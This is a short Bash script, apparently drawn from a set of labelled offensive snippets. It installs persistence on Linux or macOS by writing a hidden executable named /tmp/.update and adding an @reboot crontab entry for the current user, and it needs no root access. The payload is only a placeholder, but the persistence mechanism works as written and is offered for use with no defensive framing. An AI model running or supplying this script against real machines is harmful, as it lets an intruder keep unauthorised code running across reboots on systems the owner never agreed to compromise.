#!/usr/bin/env bash
# lang: Bash | file: persistence_cron.sh | target: Linux/macOS
# tag: persistence | shell: bash
# note: injects cron entry for current user, no root needed

PAYLOAD="/tmp/.update"
CRON_JOB="@reboot $PAYLOAD"

# write payload placeholder
cat > "$PAYLOAD" << 'INNER'
#!/usr/bin/env bash
# replace with actual payload path
INNER
chmod +x "$PAYLOAD"

# inject cron
( crontab -l 2>/dev/null | grep -v "$PAYLOAD" ; echo "$CRON_JOB" ) | crontab -
echo "[+] cron entry written:"
crontab -l | grep "$PAYLOAD"
